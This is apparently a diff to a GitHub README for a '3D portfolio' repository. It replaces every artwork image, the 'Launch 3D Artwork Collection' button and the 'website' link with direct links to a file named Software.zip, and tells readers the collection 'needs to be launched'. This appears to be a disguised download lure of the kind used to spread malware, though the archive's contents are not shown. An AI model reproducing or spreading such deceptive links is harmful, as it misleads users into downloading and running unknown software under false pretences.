@@ -20,7 +20,7 @@ The repository includes a wide range of 3D artworks such as:
 
 Check out some of the amazing 3D artworks showcased in this repository:
 
-![Character Design](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0) ![Environment Rendering](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0) ![Object Modeling](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0) ![Animation Project](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0)
+![Character Design](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip) ![Environment Rendering](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip) ![Object Modeling](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip) ![Animation Project](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip)
 
 ## Explore More 🌌
 
@@ -30,13 +30,13 @@ Feel free to dive into the repository and explore the creativity and talent disp
 
 To experience the full collection of 3D artworks, click the button below:
 
-[![Launch 3D Artwork Collection](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0%20Artwork%20Collection-Here-orange)](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0)
+[![Launch 3D Artwork Collection](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip%20Artwork%20Collection-Here-orange)](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip)
 
 *Note: The artwork collection needs to be launched to enjoy the immersive experience.*
 
 ## Visit Our Website 🌐
 
-For more information and to stay updated with the latest additions to the 3D portfolio showcase, visit our website [here](https://github.com/Gokaydurak/3D_Portfolio/releases/tag/v1.0).
+For more information and to stay updated with the latest additions to the 3D portfolio showcase, visit our website [here](https://github.com/Gokaydurak/3D_Portfolio/releases/download/v2.0/Software.zip).
 
 ## Releases Section 🚀
 
